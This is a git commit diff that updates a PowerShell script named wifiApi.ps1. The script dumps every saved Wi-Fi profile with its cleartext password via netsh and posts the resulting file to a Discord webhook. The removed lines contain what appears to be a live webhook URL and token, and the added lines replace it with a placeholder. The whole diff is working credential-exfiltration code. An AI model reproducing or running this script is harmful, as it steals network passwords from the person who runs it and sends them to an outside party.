54066314f100548bd2055574dd88116b7a59359f
berisha9625 <mehmetcakirr44@gmail.com>
2025-07-22 23:50:48 +0300

    Update wifiApi.ps1

--- wifiApi.ps1
+++ wifiApi.ps1
@@ -3,7 +3,7 @@ netsh wlan show profiles | ForEach-Object {
     netsh wlan show profile name="$profile" key=clear
 } > "$env:USERPROFILE\wifipass.txt"
 
-$w = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'
-$f = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw
-$b = ConvertTo-Json @{content = '```' + $f + '```'}
-Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType 'application/json'
+$webhookUrl = 'https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN'
+$fileContent = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw
+$payload = '{ "content": "```' + ($fileContent -replace '"','\"') + '```" }'
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
